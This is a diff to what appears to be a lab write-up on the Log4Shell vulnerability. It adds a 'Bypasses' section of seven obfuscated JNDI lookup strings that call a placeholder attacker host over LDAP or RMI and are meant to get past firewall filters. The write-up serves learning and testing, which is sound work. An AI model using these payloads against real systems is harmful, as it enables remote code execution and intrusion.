@@ -111,8 +111,19 @@ exit from the netcat
 **ssh solor@mahcineip**
 # Detection
 we alredy know the task 3 solr.log path var/solr/logs
-cat /var/solar/logs
+cat ~/var/solar/logs~
 We can checks that our code is executed
 # Bypasses
-
+**EVEN NOW FIREWALL MAKE STOPS THE JDIN LDAP OR SUCH THING**
+BUT->Some tricking ways to bypasses or mention in the below such 
+```
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${::-j}ndi:rmi://attackerendpoint.com/}
+```
+# Mitigation
 
